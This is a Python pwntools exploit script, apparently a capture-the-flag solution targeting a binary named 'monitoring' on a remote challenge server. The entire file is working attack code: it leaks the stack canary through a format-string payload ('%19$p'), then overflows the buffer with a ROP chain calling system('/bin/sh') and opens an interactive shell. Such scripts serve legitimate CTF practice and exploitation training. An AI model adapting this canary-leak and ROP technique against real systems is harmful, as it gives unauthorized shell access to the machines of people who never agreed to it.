#!/usr/bin/env python3

from pwn import *

exe = ELF("./monitoring_patched")

context.binary = exe


def conn():
    r = process([exe.path])
    return r

#r = conn()
r = remote("0.cloud.chals.io", 20001)

def leak_canary():
    r.sendlineafter(": ", "/bin/sh\x00")
    r.sendlineafter(": ", "%19$p")
    r.recvuntil("welcome : ")
    return int(r.recvline(), 16)


def main():
    
    pause()
    canary = leak_canary()
    log.warn("canary is " + hex(canary))

    r.sendline("3")
    pause()
    r.recvline()

    pop_rdi = 0x0000000000401713
    bin_sh = 0x4040c0

    r.sendline(p64(canary)*7 + p64(pop_rdi) + p64(bin_sh) + p64(pop_rdi+1) + p64(exe.plt['system']))

    r.interactive()


if __name__ == "__main__":
    main()
